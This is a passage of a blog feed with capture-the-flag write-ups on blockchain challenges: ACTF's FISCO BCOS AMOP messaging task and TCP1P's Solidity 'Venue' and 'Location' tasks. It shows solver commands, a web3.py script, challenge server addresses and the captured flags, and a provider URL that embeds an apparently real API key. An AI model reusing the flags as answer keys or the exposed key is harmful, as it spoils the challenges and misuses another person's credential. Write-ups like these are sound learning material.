&lt;pre data-lang=&quot;Shell&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-Shell &quot;&gt;&lt;code class=&quot;language-Shell&quot; data-lang=&quot;Shell&quot;&gt;&lt;span&gt;root@Aliyun-ubuntu2004:~&#x2F;fisco&#x2F;java-sdk-demo&#x2F;dist# java -cp &amp;quot;apps&#x2F;*:lib&#x2F;*:conf&#x2F;&amp;quot; org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriber flag1
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: Class path contains multiple SLF4J bindings.
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: Found binding in [jar:file:&#x2F;root&#x2F;fisco&#x2F;java-sdk-demo&#x2F;dist&#x2F;lib&#x2F;log4j-slf4j-impl-2.19.0.jar!&#x2F;org&#x2F;slf4j&#x2F;impl&#x2F;StaticLoggerBinder.class]
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: Found binding in [jar:file:&#x2F;root&#x2F;fisco&#x2F;java-sdk-demo&#x2F;dist&#x2F;lib&#x2F;log4j-slf4j-impl-2.17.1.jar!&#x2F;org&#x2F;slf4j&#x2F;impl&#x2F;StaticLoggerBinder.class]
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: See http:&#x2F;&#x2F;www.slf4j.org&#x2F;codes.html#multiple_bindings for an explanation.
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]
&lt;&#x2F;span&gt;&lt;span&gt;Start test
&lt;&#x2F;span&gt;&lt;span&gt;Step 2:Receive msg, time: 2023-10-28 14:48:23topic:flag1 content:ACTF{Con5oR7ium_B1ock_
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;Shell&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-Shell &quot;&gt;&lt;code class=&quot;language-Shell&quot; data-lang=&quot;Shell&quot;&gt;&lt;span&gt;root@Aliyun-ubuntu2004:~&#x2F;fisco&#x2F;java-sdk-demo&#x2F;dist# java -cp &amp;#39;conf&#x2F;:lib&#x2F;*:apps&#x2F;*&amp;#39; org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriberPrivateByKey subscribe flag2 conf&#x2F;privkey
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: Class path contains multiple SLF4J bindings.
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: Found binding in [jar:file:&#x2F;root&#x2F;fisco&#x2F;java-sdk-demo&#x2F;dist&#x2F;lib&#x2F;log4j-slf4j-impl-2.19.0.jar!&#x2F;org&#x2F;slf4j&#x2F;impl&#x2F;StaticLoggerBinder.class]
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: Found binding in [jar:file:&#x2F;root&#x2F;fisco&#x2F;java-sdk-demo&#x2F;dist&#x2F;lib&#x2F;log4j-slf4j-impl-2.17.1.jar!&#x2F;org&#x2F;slf4j&#x2F;impl&#x2F;StaticLoggerBinder.class]
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: See http:&#x2F;&#x2F;www.slf4j.org&#x2F;codes.html#multiple_bindings for an explanation.
&lt;&#x2F;span&gt;&lt;span&gt;SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]
&lt;&#x2F;span&gt;&lt;span&gt;Start test
&lt;&#x2F;span&gt;&lt;span&gt;Step 2:Receive msg, time: 2023-10-28 14:55:18topic:flag2 content:cHAiN_sO_INterESt1NG}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;ACTF{Con5oR7ium_B1ock_cHAiN_sO_INterESt1NG}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;amop-2&quot;&gt;AMOP 2&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;yaml&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-yaml &quot;&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Description&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;FISCO BCOS is a blockchain that allow you to pass message.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Service&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Access 120.46.58.72:48547 for RPC
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Access 120.46.58.72:41202 for channel endpoint
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;(I’ll make it up soon)&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Tcp1pctf smartcontract</title>
        <published>2023-10-16T00:00:00+08:00</published>
        <updated>2023-10-16T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/tcp1p/"/>
        <id>/blog/tcp1p/</id>
        
        <content type="html" xml:base="/blog/tcp1p/">&lt;p&gt;Since I am learning blockchain security recently, I found this competition to try out on my own over the weekend. These questions were very educational (not hard) and I also learned something. But due to other local ctfs and a few things I didn’t quite get into it.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;venue&quot;&gt;Venue&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Venue{
&lt;&#x2F;span&gt;&lt;span&gt;    string private flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    string private message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(string memory initialFlag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;string memory initialMessage){
&lt;&#x2F;span&gt;&lt;span&gt;        flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;initialFlag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        message &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;initialMessage&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;enterVenue&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;public view returns&lt;&#x2F;span&gt;&lt;span&gt;(string memory){
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;goBack&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;public view returns&lt;&#x2F;span&gt;&lt;span&gt;(string memory){
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Very concise code. This can be solved by simply calling enterVenue.&lt;&#x2F;p&gt;
&lt;p&gt;The following solving used the &lt;code&gt;web3.py&lt;&#x2F;code&gt; and ABI compiled by Remix.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;web3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Web3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# Instantiate the web3 object and specify the HTTP provider
&lt;&#x2F;span&gt;&lt;span&gt;w3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Web3&lt;&#x2F;span&gt;&lt;span&gt;(Web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;HTTPProvider&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# print(w3.eth.get_block(&amp;#39;latest&amp;#39;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# compiled in remix
&lt;&#x2F;span&gt;&lt;span&gt;abi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;	{
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;inputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;			{
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;initialFlag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;string&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;			}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;			{
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;initialMessage&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;string&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;			}
&lt;&#x2F;span&gt;&lt;span&gt;		]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;stateMutability&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;nonpayable&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;constructor&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;	{
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;inputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;[]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;enterVenue&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;outputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;			{
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;string&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;			}
&lt;&#x2F;span&gt;&lt;span&gt;		]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;stateMutability&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;view&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;function&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;	{
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;inputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;[]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;goBack&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;outputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;			{
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;string&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;			}
&lt;&#x2F;span&gt;&lt;span&gt;		]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;stateMutability&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;view&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;function&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# contract address
&lt;&#x2F;span&gt;&lt;span&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract_instance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;w3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt;(address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;abi)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;func &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;getattr&lt;&#x2F;span&gt;&lt;span&gt;(contract_instance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;functions&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;enterVenue&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)()
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;func&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;flag: &lt;&#x2F;span&gt;&lt;span&gt;{flag}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;location&quot;&gt;Location&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;===Going &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span&gt; The Party====
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;To&lt;&#x2F;span&gt;&lt;span&gt; Find the party location
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span&gt; need to solve a simple riddle regarding a SLOT
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Answer&lt;&#x2F;span&gt;&lt;span&gt; everything correctly, and find the exact location!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Question:&lt;&#x2F;span&gt;&lt;span&gt; In which Slot is Password Stored&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;ll answer with and ONLY WITH [numbers]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ex: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0,1,2,3,4.....99
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Note: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;    -   Slot start from 0
